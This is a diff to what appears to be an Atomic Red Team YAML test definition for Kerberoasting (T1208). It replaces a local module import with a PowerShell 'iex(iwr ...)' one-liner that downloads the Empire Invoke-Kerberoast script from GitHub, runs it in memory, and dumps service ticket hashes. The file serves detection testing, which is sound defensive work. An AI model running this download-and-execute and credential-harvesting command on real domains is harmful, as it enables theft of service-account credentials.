@@ -20928,19 +20928,20 @@ credential-access:
       identifier: T1208
     atomic_tests:
     - name: Request for service tickets
-      description: |
-        This test uses the Powershell Empire Module: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
-
-        The following are further sources and credits for this attack:
-        [Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
-        [Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
+      description: "This test uses the Powershell Empire Module: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1\n\nThe
+        following are further sources and credits for this attack:\n[Kerberoasting
+        Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast
+        source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen
+        executed successfully , the test displays available services with their hashes.
+        \nIf the testing domain doesn't have any service principal name configured,
+        there is no output \n"
       supported_platforms:
       - windows
       executor:
         name: powershell
         elevation_required: false
         command: |
-          Import-Module .\Invoke-Kerberoast.ps1
+          iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
           Invoke-Kerberoast | fl
   T1142:
     technique:
